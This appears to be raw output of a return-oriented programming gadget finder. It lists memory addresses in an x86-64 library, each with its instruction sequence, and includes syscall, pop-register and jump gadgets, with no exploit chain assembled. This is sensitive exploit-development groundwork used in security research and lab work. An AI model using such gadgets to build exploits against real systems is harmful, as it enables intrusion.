0x00002aaaaac812c7 : add byte ptr [rax], cl ; fcomi st(3) ; call qword ptr [rdi]
0x00002aaaaac84ae7 : add byte ptr [rax], cl ; insb byte ptr [rdi], dx ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac8a8a7 : add byte ptr [rax], cl ; loop 0x1b58aa ; call rsi
0x00002aaaaab02d74 : add byte ptr [rax], cl ; movzx eax, ax ; ret
0x00002aaaaac84e27 : add byte ptr [rax], cl ; outsd dx, dword ptr [rsi] ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac8be97 : add byte ptr [rax], cl ; push 0xf7 ; jmp rsi
0x00002aaaaac7d4e7 : add byte ptr [rax], cl ; sbb al, 0xf1 ; jmp qword ptr [rcx]
0x00002aaaaac76ec7 : add byte ptr [rax], cl ; sbb ebp, ebp ; jmp qword ptr [rax]
0x00002aaaaac82017 : add byte ptr [rax], cl ; xchg eax, esp ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac7bf77 : add byte ptr [rax], cl ; xchg eax, esp ; sti ; call qword ptr [rax]
0x00002aaaaac7f52f : add byte ptr [rax], dh ; and al, 0xf2 ; jmp qword ptr [rcx]
0x00002aaaaac7708f : add byte ptr [rax], dh ; in eax, dx ; call rdx
0x00002aaaaab7dfff : add byte ptr [rax], dh ; in eax, dx ; mov byte ptr [rdi], ch ; ret
0x00002aaaaac855df : add byte ptr [rax], dh ; jnp 0x1b05dc ; jmp qword ptr [rcx]
0x00002aaaaac7eddf : add byte ptr [rax], dh ; or dh, dl ; call rsi
0x00002aaaaaae14e7 : add byte ptr [rax], dh ; ret
0x00002aaaaac8260f : add byte ptr [rax], dh ; test al, 0xf4 ; jmp qword ptr [rcx]
0x00002aaaaac81eff : add byte ptr [rax], dh ; xchg eax, ebx ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac6920f : add byte ptr [rax], dl ; add bl, bh ; jmp rax
0x00002aaaaabfae82 : add byte ptr [rax], dl ; add bl, ch ; leave ; mov eax, 0x200000 ; jmp 0x125e5b
0x00002aaaaabcc639 : add byte ptr [rax], dl ; add byte ptr [rax], al ; mov rax, rbp ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaabe9b40 : add byte ptr [rax], dl ; add byte ptr [rax], al ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab3fd25 : add byte ptr [rax], dl ; add byte ptr [rax], al ; pop rbx ; ret
0x00002aaaaab3fd33 : add byte ptr [rax], dl ; add byte ptr [rax], al ; xor eax, eax ; pop rbx ; ret
0x00002aaaaac8702f : add byte ptr [rax], dl ; and esi, esi ; jmp qword ptr [rsi]
0x00002aaaaac6b5af : add byte ptr [rax], dl ; jmp 0x1965b7
0x00002aaaaac710cf : add byte ptr [rax], dl ; jno 0x19c0d4 ; jmp qword ptr [rdi]
0x00002aaaaac84eff : add byte ptr [rax], dl ; jo 0x1afefc ; jmp qword ptr [rcx]
0x00002aaaaab02e54 : add byte ptr [rax], dl ; movzx eax, ax ; ret
0x00002aaaaac8384f : add byte ptr [rax], dl ; push rsp ; call rsi
0x00002aaaaac8fcef : add byte ptr [rax], dl ; push rsp ; clc ; call qword ptr [rax]
0x00002aaaaaaed24f : add byte ptr [rax], dl ; ret
0x00002aaaaac822df : add byte ptr [rax], dl ; wait ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac8f57f : add byte ptr [rax], dl ; xchg eax, edi ; sti ; jmp qword ptr [rdx]
0x00002aaaaac74b0f : add byte ptr [rax], dl ; xor ebp, ebx ; jmp qword ptr [rsi]
0x00002aaaaac74bed : add byte ptr [rax], r8b ; adc byte ptr [rax - 0x15], dl ; call rdi
0x00002aaaaac73af8 : add byte ptr [rax], r8b ; add ah, al ; cmp eax, dword ptr [rax] ; add al, ah ; xor al, 0xea ; jmp rax
0x00002aaaaac83910 : add byte ptr [rax], r8b ; add ah, bl ; cmp dword ptr [rcx], eax ; add byte ptr [rax], bl ; add esi, ebp ; call qword ptr [rdi]
0x00002aaaaac84500 : add byte ptr [rax], r8b ; add ah, cl ; add dword ptr [r8], r8d ; pop rax ; cmc ; jmp rax
0x00002aaaaac84728 : add byte ptr [rax], r8b ; add ah, dh ; add dword ptr [r8], r8d ; loopne 0x1af790 ; cmc ; call qword ptr [rdx]
0x00002aaaaac74b08 : add byte ptr [rax], r8b ; add ah, dl ; add byte ptr [r8], al ; adc byte ptr [rbx], dh ; jmp 0x19fb1e
0x00002aaaaac90460 : add byte ptr [rax], r8b ; add byte ptr [rax + 0x6f980002], ch ; clc ; call rcx
0x00002aaaaac77ca8 : add byte ptr [rax], r8b ; add byte ptr [rbp + rdi*2], dh ; add al, dh ; in eax, dx ; jmp rsi
0x00002aaaaac74ab8 : add byte ptr [rax], r8b ; add byte ptr [rbx + rcx*2 + 0x32400000], al ; jmp 0x19face
0x00002aaaaac76888 : add byte ptr [rax], r8b ; add byte ptr [rcx + rbp*2], dl ; add byte ptr [rax], ah ; add ebp, ebp ; call qword ptr [rsi]
0x00002aaaaac8a8a0 : add byte ptr [rax], r8b ; add byte ptr [rcx + rbp*4 + 1], ch ; add byte ptr [rax], cl ; loop 0x1b58b1 ; call rsi
0x00002aaaaac74e58 : add byte ptr [rax], r8b ; add byte ptr [rdi + rcx*2], ah ; add byte ptr [rax], al ; nop ; pop rsp ; jmp 0x19fe6e
0x00002aaaaac79658 : add byte ptr [rax], r8b ; add byte ptr [rdi + rdx*4], ah ; add byte ptr [rax], al ; rol dl, 1 ; in eax, dx ; jmp qword ptr [rsi]
0x00002aaaaac81448 : add byte ptr [rax], r8b ; add byte ptr [rdx + 0xd500001], dl ; hlt ; jmp rcx
0x00002aaaaac801b8 : add byte ptr [rax], r8b ; add byte ptr [rdx + rax - 0x1abfffff], al ; call qword ptr [rsi]
0x00002aaaaac8e5a0 : add byte ptr [rax], r8b ; add byte ptr [rsi + 1], ch ; add al, bh ; push rdi ; call qword ptr [rdx]
0x00002aaaaac78da8 : add byte ptr [rax], r8b ; add byte ptr [rsi + rcx*4], dh ; add al, dl ; mov ebp, ebp ; jmp qword ptr [rbx]
0x00002aaaaac82540 : add byte ptr [rax], r8b ; add byte ptr [rsi], cl ; add dword ptr [rax], eax ; movsq qword ptr [rdi], qword ptr [rsi] ; hlt ; call rax
0x00002aaaaac803d0 : add byte ptr [rax], r8b ; add byte ptr [rsp + rax - 0xfe7ffff], bl ; call rcx
0x00002aaaaac7fbd8 : add byte ptr [rax], r8b ; add byte ptr [rsp + rdi*8 - 0x59600000], ah ; call rdi
0x00002aaaaab1d0d5 : add byte ptr [rax], r8b ; add rsp, 0x10 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaac0f33d : add byte ptr [rax], r8b ; add rsp, 0x18 ; xor eax, eax ; pop rbx ; pop rbp ; ret
0x00002aaaaab5f8f5 : add byte ptr [rax], r8b ; add rsp, 8 ; xor eax, eax ; pop rbx ; pop rbp ; ret
0x00002aaaaab49696 : add byte ptr [rax], r8b ; cmp eax, 0xff ; jne 0x746a9 ; pop rbx ; ret
0x00002aaaaab0a0d5 : add byte ptr [rax], r8b ; fstp st(1) ; ret
0x00002aaaaab01b35 : add byte ptr [rax], r8b ; lea rax, qword ptr [rip + 0x15f406] ; ret
0x00002aaaaaba9d2d : add byte ptr [rax], r8b ; mov byte ptr [rdi + 8], 2 ; xor eax, eax ; ret
0x00002aaaaab72e0d : add byte ptr [rax], r8b ; mov byte ptr [rdi], 0 ; mov rax, rdi ; ret
0x00002aaaaab72e3d : add byte ptr [rax], r8b ; mov dword ptr [rdi], ecx ; mov rax, rdi ; ret
0x00002aaaaab5bbed : add byte ptr [rax], r8b ; mov eax, 0x16 ; ret
0x00002aaaaaba18cd : add byte ptr [rax], r8b ; mov eax, 0x6f ; syscall ; ret
0x00002aaaaab907bd : add byte ptr [rax], r8b ; mov eax, 0xc9 ; syscall ; ret
0x00002aaaaabdbbfd : add byte ptr [rax], r8b ; mov eax, 0xe4 ; syscall ; ret
0x00002aaaaab5cafd : add byte ptr [rax], r8b ; mov eax, 0xffffffff ; ret
0x00002aaaaaba2e85 : add byte ptr [rax], r8b ; mov eax, 1 ; ret
0x00002aaaaac0d33d : add byte ptr [rax], r8b ; mov eax, 2 ; ret
0x00002aaaaab4802d : add byte ptr [rax], r8b ; mov eax, dword ptr [rdx] ; ret
0x00002aaaaab45155 : add byte ptr [rax], r8b ; mov eax, edi ; ret
0x00002aaaaab7a1ad : add byte ptr [rax], r8b ; mov edx, dword ptr [rsi] ; mov dword ptr [rdi], edx ; ret
0x00002aaaaab4b530 : add byte ptr [rax], r8b ; mov edx, eax ; jmp 0x764d3
0x00002aaaaab6911d : add byte ptr [rax], r8b ; mov qword ptr [rdi + 0x38], r9 ; ret
0x00002aaaaabed76d : add byte ptr [rax], r8b ; mov qword ptr [rsi], rdi ; xor eax, eax ; ret
0x00002aaaaab42da5 : add byte ptr [rax], r8b ; mov rax, -1 ; ret
0x00002aaaaabe8de5 : add byte ptr [rax], r8b ; mov rax, qword ptr [rax + 0x30] ; ret
0x00002aaaaabda675 : add byte ptr [rax], r8b ; mov rax, qword ptr [rax + 8] ; ret
0x00002aaaaac0ff55 : add byte ptr [rax], r8b ; mov rax, qword ptr [rdi + 8] ; mov rax, qword ptr [rax + 0x40] ; jmp rax
0x00002aaaaac0ff65 : add byte ptr [rax], r8b ; mov rax, qword ptr [rdi + 8] ; mov rax, qword ptr [rax + 0x48] ; jmp rax
0x00002aaaaab08ead : add byte ptr [rax], r8b ; mov rax, rcx ; ret
0x00002aaaaab7b41d : add byte ptr [rax], r8b ; mov rax, rdi ; ret
0x00002aaaaab7a1ed : add byte ptr [rax], r8b ; mov rdx, qword ptr [rsi] ; mov qword ptr [rdi], rdx ; ret
0x00002aaaaab72ead : add byte ptr [rax], r8b ; mov word ptr [rdi], si ; lea rax, qword ptr [rdi + 1] ; ret
0x00002aaaaab09e5d : add byte ptr [rax], r8b ; movaps xmm0, xmm1 ; add rsp, 0x28 ; ret
0x00002aaaaab1e835 : add byte ptr [rax], r8b ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x00002aaaaac0099d : add byte ptr [rax], r8b ; pop rbx ; ret
0x00002aaaaab1aa35 : add byte ptr [rax], r8b ; ret
0x00002aaaaab51015 : add byte ptr [rax], r8b ; sub r8, rcx ; lea eax, dword ptr [r8 - 1] ; ret
0x00002aaaaab09c55 : add byte ptr [rax], r8b ; test eax, 0x7fffff ; je 0x34c54 ; ret
0x00002aaaaac18215 : add byte ptr [rax], r8b ; xor eax, eax ; add rsp, 0x38 ; ret
0x00002aaaaab0f7fd : add byte ptr [rax], r8b ; xor eax, eax ; pop rbx ; ret
0x00002aaaaab0ef05 : add byte ptr [rax], r8b ; xor eax, eax ; ret
0x00002aaaaab800bd : add byte ptr [rax], r8b ; xor rax, rax ; ret
0x00002aaaaac17bb7 : add byte ptr [rbp + 0x16], dh ; add rsp, 0x38 ; ret
0x00002aaaaaba203f : add byte ptr [rbp + 0x1b8ff], al ; add byte ptr [rax], al ; js 0xcd05b ; ret
0x00002aaaaab1f59f : add byte ptr [rbp + 0x29], cl ; ret 0xc149
0x00002aaaaac17a7c : add byte ptr [rbp + 0x29], dh ; xor eax, eax ; add rsp, 0x48 ; ret
0x00002aaaaab8e267 : add byte ptr [rbp + 0x29dc75db], al ; ret
0x00002aaaaabe713d : add byte ptr [rbp + 0x2f], dh ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x00002aaaaab28993 : add byte ptr [rbp + 0x310c75c0], al ; div dh ; ret 0x4050
0x00002aaaaabc0af2 : add byte ptr [rbp + 0x31], al ; fild dword ptr [rbx + 0xf4104f8] ; xchg eax, esp ; ret
0x00002aaaaaafea71 : add byte ptr [rbp + 0x31], al ; leave ; call r15
0x00002aaaaab9756d : add byte ptr [rbp + 0x31], al ; ror byte ptr [rax - 0x7d], cl ; ret
0x00002aaaaab69383 : add byte ptr [rbp + 0x31], al ; ror byte ptr [rcx - 0x39], cl ; ret
0x00002aaaaabe9ddf : add byte ptr [rbp + 0x31], dl ; ror byte ptr [rax - 0x77], 0xe5 ; pop rbp ; ret
0x00002aaaaab8e2bb : add byte ptr [rbp + 0x390a74db], al ; ret
0x00002aaaaabd6a8a : add byte ptr [rbp + 0x395374c0], al ; ret
0x00002aaaaab55d5e : add byte ptr [rbp + 0x39], cl ; ret 0x8948
0x00002aaaaab55ed6 : add byte ptr [rbp + 0x39], cl ; ret 0x976
0x00002aaaaab90c77 : add byte ptr [rbp + 0x41], bl ; pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x00002aaaaaaf53df : add byte ptr [rbp + 0x41], bl ; pop rsp ; pop r13 ; pop r14 ; ret
0x00002aaaaab29d9e : add byte ptr [rbp + 0x41], bl ; pop rsp ; pop r13 ; ret
0x00002aaaaab45b71 : add byte ptr [rbp + 0x41], bl ; pop rsp ; ret
0x00002aaaaab61c7e : add byte ptr [rbp + 0x480d75c0], al ; add esp, 8 ; ret
0x00002aaaaab3fcbe : add byte ptr [rbp + 0x480d75c0], al ; mov eax, ebx ; pop rbx ; ret
0x00002aaaaabf81f3 : add byte ptr [rbp + 0x49], dh ; mov eax, r8d ; ret
0x00002aaaaab882f7 : add byte ptr [rbp + 0x6b840fdb], al ; or al, byte ptr [rax] ; add byte ptr [rax - 0x48], cl ; ret 0xffff
0x00002aaaaab4e5e5 : add byte ptr [rbp + 0x6b8948c9], al ; adc byte ptr [rax + 0xf], cl ; ret 0x8948
0x00002aaaaab4db35 : add byte ptr [rbp + 0x6b894cc9], al ; adc byte ptr [rax + 0xf], cl ; ret 0x8948
0x00002aaaaabe056b : add byte ptr [rbp + 0xa], dh ; jmp 0x10b599
0x00002aaaaabf0081 : add byte ptr [rbp + 0xa], dh ; jmp 0x11b0b0
0x00002aaaaac0b583 : add byte ptr [rbp + 0xa], dh ; jmp 0x1365b1
0x00002aaaaab5a952 : add byte ptr [rbp + 0xa], dh ; jmp 0x85980
0x00002aaaaabf00d9 : add byte ptr [rbp + 0xb], dh ; jmp 0x11b10a
0x00002aaaaabd4be1 : add byte ptr [rbp + 0xb], dh ; jmp 0xffc11
0x00002aaaaab94268 : add byte ptr [rbp + 0xd], dh ; mov rax, rdx ; add rsp, 8 ; ret
0x00002aaaaac0228c : add byte ptr [rbp + 0xf1374d2], al ; mov dh, 0x40 ; or dh, dh ; ret 0x8802
0x00002aaaaab1daef : add byte ptr [rbp + 0xf], cl ; lodsd eax, dword ptr [rsi] ; ret
0x00002aaaaab1d9df : add byte ptr [rbp + 0xf], cl ; movsd dword ptr [rdi], dword ptr [rsi] ; ret
0x00002aaaaab0f6ca : add byte ptr [rbp + 3], dh ; pop rbx ; ret
0x00002aaaaab5ffa6 : add byte ptr [rbp + 7], dh ; lea rax, qword ptr [rip + 0x10] ; ret
0x00002aaaaab63e36 : add byte ptr [rbp + 7], dh ; lea rax, qword ptr [rip + 0x80] ; ret
0x00002aaaaab5e14a : add byte ptr [rbp + 7], dh ; lea rax, qword ptr [rip + 0xc] ; ret
0x00002aaaaab63e99 : add byte ptr [rbp + 7], dh ; lea rax, qword ptr [rip + 0xd] ; ret
0x00002aaaaab63010 : add byte ptr [rbp + 8], dh ; lea rax, qword ptr [rip + 0x26] ; ret
0x00002aaaaab6888b : add byte ptr [rbp + 8], dh ; lea rax, qword ptr [rip + 0xb3db] ; ret
0x00002aaaaab80cb0 : add byte ptr [rbp + 8], dh ; lea rax, qword ptr [rip + 0xe916] ; ret
0x00002aaaaab800e0 : add byte ptr [rbp + 8], dh ; lea rax, qword ptr [rip + 0xf596] ; ret
0x00002aaaaac17b44 : add byte ptr [rbp + 9], dh ; xor eax, eax ; add rsp, 0x48 ; ret
0x00002aaaaac6d5bf : add byte ptr [rbp + rax - 0xa], dh ; call rsp
0x00002aaaaac6ac4f : add byte ptr [rbp + rbp - 0x17], dl ; call rsp
0x00002aaaaac6d017 : add byte ptr [rbp + rbp*2 - 0xd], ah ; call rsp
0x00002aaaaac6e39f : add byte ptr [rbp + rbp*2 - 9], al ; call rsp
0x00002aaaaac6af97 : add byte ptr [rbp + rbp*8 - 0x17], dl ; call rsp
0x00002aaaaac6b8df : add byte ptr [rbp + rbx*2 - 0x13], dh ; jmp rsp
0x00002aaaaac79cbb : add byte ptr [rbp + rbx*4 + 0x1900000], al ; out dx, al ; call qword ptr [rsi]
0x00002aaaaac6aa87 : add byte ptr [rbp + rbx*4 - 0x18], al ; call rsp
0x00002aaaaab433b8 : add byte ptr [rbp + rcx + 0x48], dh ; add esp, 8 ; mov eax, edx ; pop rbx ; pop rbp ; ret
0x00002aaaaac51577 : add byte ptr [rbp + rcx + 0xdbf0000], bh ; add byte ptr [rax], al ; ret 0xd
0x00002aaaaab2ab85 : add byte ptr [rbp + rcx*4 + 0x2c], cl ; test dword ptr [rax], eax ; add byte ptr [rax], al ; add byte ptr [rax + 0x29], cl ; ret
0x00002aaaaab551ff : add byte ptr [rbp + rcx*4 + 0x2d], cl ; push rcx ; add dword ptr [rcx], edx ; add cl, ch ; ret 0xfffe
0x00002aaaaab4a1a1 : add byte ptr [rbp + rcx*4 + 0x4c], cl ; and al, 0x10 ; mov rdi, r12 ; call rbx
0x00002aaaaac00f92 : add byte ptr [rbp + rcx*4 + 0x4c], cl ; and al, 0x18 ; call qword ptr [rax]
0x00002aaaaab4a0be : add byte ptr [rbp + rcx*4 + 0x4c], cl ; and al, 0x18 ; mov rdi, r12 ; call rbx
0x00002aaaaab80ffc : add byte ptr [rbp + rcx*4 + 0x4c], cl ; and al, 0x28 ; lea rcx, qword ptr [rax + 1] ; call rbx
0x00002aaaaac01379 : add byte ptr [rbp + rcx*4 + 0x4c], cl ; and al, 0x30 ; call qword ptr [rax]
0x00002aaaaabfd315 : add byte ptr [rbp + rcx*4 + 0x67], cl ; xor byte ptr [rax - 0x7b], cl ; ror byte ptr [rax + 0xf], 0x44 ; ret 0x8b4c
0x00002aaaaab42716 : add byte ptr [rbp + rcx*4 + 5], cl ; ret 0x3549
0x00002aaaaac77cab : add byte ptr [rbp + rdi*2], dh ; add al, dh ; in eax, dx ; jmp rsi
0x00002aaaaac8fceb : add byte ptr [rbp + rdi*8 + 0x54100001], dh ; clc ; call qword ptr [rax]
0x00002aaaaac6e6cf : add byte ptr [rbp + rdi*8 - 9], dl ; jmp rsp
0x00002aaaaac6e32f : add byte ptr [rbp + rdx*2 - 9], dh ; call rsp
0x00002aaaaac7f49b : add byte ptr [rbp + rsi*8], ah ; add byte ptr [rax], al ; and al, 0xf2 ; jmp qword ptr [rcx]
0x00002aaaaac7f483 : add byte ptr [rbp + rsi*8], cl ; add al, ch ; and esi, edx ; jmp qword ptr [rcx]
0x00002aaaaac7ca20 : add byte ptr [rbp - 0x10], dl ; call qword ptr [rax]
0x00002aaaaac48734 : add byte ptr [rbp - 0x1f], dh ; pop rbx ; ret
0x00002aaaaab83024 : add byte ptr [rbp - 0x276b213], al ; setne dl ; jmp 0xae040
0x00002aaaaab85945 : add byte ptr [rbp - 0x276b213], al ; setne dl ; jmp 0xb0960
0x00002aaaaab880fc : add byte ptr [rbp - 0x276b213], al ; setne dl ; jmp 0xb3120
0x00002aaaaaba1fef : add byte ptr [rbp - 0x27], dh ; xor eax, eax ; ret
0x00002aaaaac103c6 : add byte ptr [rbp - 0x33], dh ; add rsp, 0x10 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaaba1de0 : add byte ptr [rbp - 0x38], dh ; ret
0x00002aaaaac51823 : add byte ptr [rbp - 0x3ffffff1], bh ; sldt word ptr [rax] ; ret
0x00002aaaaaba1f52 : add byte ptr [rbp - 0x46], dh ; mov eax, 0x40 ; ret
0x00002aaaaac1088f : add byte ptr [rbp - 0x47f38a2e], al ; add dword ptr [rax], eax ; add byte ptr [rax], al ; ret
0x00002aaaaabe8ec5 : add byte ptr [rbp - 0x47f98a40], al ; add dword ptr [rax], eax ; add byte ptr [rax], al ; ret
0x00002aaaaab7ed33 : add byte ptr [rbp - 0x6bf0be13], al ; ret 0xfe83
0x00002aaaaac17e39 : add byte ptr [rbp - 0x73], cl ; lodsb al, byte ptr [rsi] ; and al, 0x70 ; add al, 0 ; add byte ptr [rax - 0x7f], cl ; ret
0x00002aaaaab4136f : add byte ptr [rbp - 0x76bb7ffc], cl ; ret 0xf229
0x00002aaaaab72e7c : add byte ptr [rbp - 0x77], al ; leave ; movsxd r9, dword ptr [rax + r9*4] ; add rax, r9 ; jmp rax
0x00002aaaaab568ce : add byte ptr [rbp - 0x77cfdb9], cl ; add al, 0x74 ; and al, 0x89 ; ret 0xb48b
0x00002aaaaac6a26c : add byte ptr [rbp - 0x7b6f0004], al ; cld ; jmp qword ptr [rax]
0x00002aaaaabb7d8c : add byte ptr [rbp - 0x7b], al ; ror byte ptr [rdi], 0x84 ; ret 0xfffd
0x00002aaaaab987e2 : add byte ptr [rbp - 0x7b], al ; test byte ptr [rdi], 0x84 ; ret
0x00002aaaaab0e957 : add byte ptr [rbp - 0x7b], cl ; dec dword ptr [rax - 0x77] ; ret
0x00002aaaaab252fd : add byte ptr [rbp - 0x7b], cl ; in al, 0xf ; test byte ptr [rcx - 0x77000000], dh ; ret 0xe283
0x00002aaaaaaf9ab0 : add byte ptr [rbp - 0x7b], cl ; test byte ptr [rdi], 0x85 ; ret 3
0x00002aaaaab7325b : add byte ptr [rbp - 0x7c], al ; sal byte ptr [rcx + 0x44], 0x38 ; ret 0x4153
0x00002aaaaab30eff : add byte ptr [rbp - 0x7cb776f4], cl ; ret 0x8d01
0x00002aaaaabaf655 : add byte ptr [rbp - 0x7cb7fead], cl ; ret
0x00002aaaaabaa14f : add byte ptr [rbp - 0x7cb7febd], cl ; ret
0x00002aaaaabf6d9e : add byte ptr [rbp - 0x9f38b2e], al ; ret 0xc602
0x00002aaaaab1c057 : add byte ptr [rbp - 0xa], dh ; mov rax, rbx ; pop rbx ; ret
0x00002aaaaac84bf0 : add byte ptr [rbp - 0xb], ch ; jmp qword ptr [rcx]
0x00002aaaaab59c65 : add byte ptr [rbp - 0xcf98740], al ; ret
0x00002aaaaab0a305 : add byte ptr [rbp - 0xcf98a40], al ; ret
0x00002aaaaab40457 : add byte ptr [rbp - 0xcfb8b37], al ; ret
0x00002aaaaac7dd50 : add byte ptr [rbp - 0xf], bl ; jmp qword ptr [rcx]
0x00002aaaaac69d80 : add byte ptr [rbp - 4], bl ; call qword ptr [rax + 0x20fffc5c]
0x00002aaaaac6ef9f : add byte ptr [rbp - 7], dh ; call rsp
0x00002aaaaac6ea87 : add byte ptr [rbp - 8], ah ; jmp rsp
0x00002aaaaac1b0f9 : add byte ptr [rbx + 0x148b8104], cl ; xchg eax, ecx ; sub eax, edx ; ret
0x00002aaaaac050c9 : add byte ptr [rbx + 0x149fce0], al ; ret 0x8b41
0x00002aaaaac16f66 : add byte ptr [rbx + 0x16ba19f8], al ; add byte ptr [rax], al ; add byte ptr [rdi], cl ; ret 0x8941
0x00002aaaaab90aef : add byte ptr [rbx + 0x18b818fa], al ; add byte ptr [rax], al ; add byte ptr [rdi], cl ; ret 0x3bba
0x00002aaaaab4c42f : add byte ptr [rbx + 0x2002507], cl ; add byte ptr [rax], al ; ret
0x00002aaaaab7f08b : add byte ptr [rbx + 0x25], bl ; add ah, bh ; add eax, dword ptr [rax] ; ret
0x00002aaaaab49698 : add byte ptr [rbx + 0x275fff8], al ; pop rbx ; ret
0x00002aaaaab1a6a6 : add byte ptr [rbx + 0x28ba28f8], al ; add byte ptr [rax], al ; add byte ptr [rdi], cl ; ret 0x8539
0x00002aaaaab7e04f : add byte ptr [rbx + 0x30178916], cl ; in eax, dx ; mov byte ptr [rdi + 4], ch ; ret
0x00002aaaaab437e7 : add byte ptr [rbx + 0x31], bl ; rcr byte ptr [rbp + 0x41], 0x5c ; pop r13 ; pop r14 ; ret
0x00002aaaaab68835 : add byte ptr [rbx + 0x31], bl ; rcr byte ptr [rbp + 0x41], 0x5c ; ret
0x00002aaaaab55ec7 : add byte ptr [rbx + 0x342c5615], cl ; add dh, dh ; ret 0xf02
0x00002aaaaab51ba7 : add byte ptr [rbx + 0x348bb505], al ; add byte ptr [rcx], al ; ret
0x00002aaaaab7a1df : add byte ptr [rbx + 0x3568b0e], cl ; mov dword ptr [rdi], ecx ; mov dword ptr [rdi + 3], edx ; ret
0x00002aaaaaafec80 : add byte ptr [rbx + 0x41], bl ; pop rsp ; pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret
0x00002aaaaaba1868 : add byte ptr [rbx + 0x41], bl ; pop rsp ; pop r13 ; pop rbp ; ret
0x00002aaaaabd08ea : add byte ptr [rbx + 0x44], bl ; mov eax, eax ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaab27c8d : add byte ptr [rbx + 0x44], bl ; mov eax, eax ; pop rbp ; pop r12 ; ret
0x00002aaaaab7ae8f : add byte ptr [rbx + 0x4568a0e], cl ; mov dword ptr [rdi], ecx ; mov byte ptr [rdi + 4], dl ; ret
0x00002aaaaab7a1bf : add byte ptr [rbx + 0x477880e], cl ; mov dword ptr [rdi], ecx ; ret
0x00002aaaaac3f43f : add byte ptr [rbx + 0x48028901], cl ; lea eax, dword ptr [rdx + 3] ; ret
0x00002aaaaac427ef : add byte ptr [rbx + 0x48028901], cl ; mov eax, edi ; ret
0x00002aaaaabf37a1 : add byte ptr [rbx + 0x4804c244], cl ; add esp, 8 ; pop rbx ; pop rbp ; ret
0x00002aaaaab0a838 : add byte ptr [rbx + 0x480c2444], cl ; add esp, 0x10 ; pop rbx ; ret
0x00002aaaaab7c5df : add byte ptr [rbx + 0x48178916], cl ; lea eax, dword ptr [rdi + 4] ; ret
0x00002aaaaab7ede7 : add byte ptr [rbx + 0x48], bl ; add eax, 1 ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaab732bc : add byte ptr [rbx + 0x48], bl ; mov dword ptr [rdi], edx ; ret
0x00002aaaaab44c81 : add byte ptr [rbx + 0x48], bl ; mov eax, esi ; pop rbp ; pop r12 ; ret
0x00002aaaaab5ac87 : add byte ptr [rbx + 0x4c], bl ; mov esi, esp ; pop rbp ; pop r12 ; jmp rax
0x00002aaaaac2f50f : add byte ptr [rbx + 0x5789fc56], cl ; cld ; ret
0x00002aaaaabaa040 : add byte ptr [rbx + 0x5b010443], al ; pop rbp ; pop r12 ; ret
0x00002aaaaab590f7 : add byte ptr [rbx + 0x5d], bl ; pop r12 ; jmp rax
0x00002aaaaaafa319 : add byte ptr [rbx + 0x5d], bl ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00002aaaaaaf52e0 : add byte ptr [rbx + 0x5d], bl ; pop r12 ; pop r13 ; pop r14 ; ret
0x00002aaaaaafedab : add byte ptr [rbx + 0x5d], bl ; pop r12 ; pop r13 ; ret
0x00002aaaaaaf4b0f : add byte ptr [rbx + 0x5d], bl ; pop r12 ; ret
0x00002aaaaab0a8d8 : add byte ptr [rbx + 0x5d], bl ; ret
0x00002aaaaab4cf0f : add byte ptr [rbx + 0x5e8c107], cl ; and eax, 1 ; ret
0x00002aaaaab7a8a9 : add byte ptr [rbx + 0x63], cl ; or al, 0x83 ; lea rcx, qword ptr [r11 + rcx] ; jmp rcx
0x00002aaaaac81c4b : add byte ptr [rbx + 0x66b00001], dl ; stc ; call qword ptr [rax]
0x00002aaaaabca37f : add byte ptr [rbx + 0x6890447], cl ; xor eax, eax ; ret
0x00002aaaaababcb8 : add byte ptr [rbx + 0x6b806fa], al ; add byte ptr [rax], al ; add byte ptr [rdi], cl ; ret 0xc689
0x00002aaaaab4c3ff : add byte ptr [rbx + 0x8042507], cl ; add byte ptr [rax], al ; ret
0x00002aaaaab81068 : add byte ptr [rbx + 0xa777fff], al ; mov eax, edi ; ret
0x00002aaaaac0861f : add byte ptr [rbx + 0xb74023e], al ; mov eax, 1 ; ret
0x00002aaaaac2fbbf : add byte ptr [rbx + 0xe8b0156], cl ; mov dword ptr [rdi + 1], edx ; mov dword ptr [rdi], ecx ; ret
0x00002aaaaac2fb4f : add byte ptr [rbx + 0xe8b0256], cl ; mov dword ptr [rdi + 2], edx ; mov dword ptr [rdi], ecx ; ret
0x00002aaaaac2fadf : add byte ptr [rbx + 0xe8b0356], cl ; mov dword ptr [rdi + 3], edx ; mov dword ptr [rdi], ecx ; ret
0x00002aaaaac7a290 : add byte ptr [rbx + 0xe], cl ; adc byte ptr [rbx + 0xa440202], al ; ret
0x00002aaaaabba11c : add byte ptr [rbx + 0xf4801e1], al ; ret
0x00002aaaaab0f9ff : add byte ptr [rbx + 0xf48fffa], al ; ret
0x00002aaaaac9149b : add byte ptr [rbx + 1], al ; add byte ptr [rax], al ; ret
0x00002aaaaaad57bc : add byte ptr [rbx + 1], al ; ret 0x102
0x00002aaaaac6f3df : add byte ptr [rbx + rax - 6], al ; call rsp
0x00002aaaaac44c9a : add byte ptr [rbx + rax - 9], bh ; fadd st(3) ; ret
0x00002aaaaac6cb7f : add byte ptr [rbx + rax*2 - 0xe], dh ; call rsp
0x00002aaaaac6fa5f : add byte ptr [rbx + rax*8], ah ; cli ; jmp rsp
0x00002aaaaabe7334 : add byte ptr [rbx + rbp], cl ; add byte ptr [rax + 0xf], cl ; ret
0x00002aaaaac79a5b : add byte ptr [rbx + rbx*4], ah ; add byte ptr [rax], al ; mov al, 0xf0 ; in eax, dx ; call rsi
0x00002aaaaac6ed07 : add byte ptr [rbx + rbx*8], dh ; clc ; call rsp
0x00002aaaaabe0daa : add byte ptr [rbx + rcx + 0x5b], dh ; mov eax, edx ; pop rbp ; pop r12 ; ret
0x00002aaaaab44dc2 : add byte ptr [rbx + rcx + 0x5b], dh ; pop rbp ; pop r12 ; ret
